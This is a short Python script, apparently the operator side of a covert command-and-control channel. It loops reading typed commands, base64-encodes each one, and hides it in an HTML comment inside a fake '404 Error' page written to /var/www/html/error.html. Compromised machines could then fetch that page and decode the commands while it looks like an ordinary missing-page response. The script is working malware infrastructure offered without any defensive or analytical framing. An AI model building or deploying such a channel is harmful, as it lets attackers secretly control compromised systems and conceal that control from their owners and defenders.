"""
Servers the 404 page
"""
import base64

while True:
    command = input("Enter your command: ")
    encoded = str(base64.b64encode(command.encode('ascii')))[2:-1]
    error = open('/var/www/html/error.html', 'w')
    page = '''
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n
        <!---COMMENTS: ''' + encoded + '''-----!>\n
    	<div class="wrapper row2">\n
    	<div id="container" class="clear">\n
    		 <div id="fof" class="clear">\n
    			<div class="positioned">\n
    				<div class="hgroup">\n
    					<h1>404 Error</h1>\n
    					<h2>DOH! Page Not Found&hellip;</h2>\n
    				</div>\n
    				<p>The Page You Requested Could Not Be Found On Our Server</p>\n
    			</div>\n
    		</div>\n
    	</div>\n
    </div>\n'''

    error.write(page)
    # error.truncate()
    error.close()

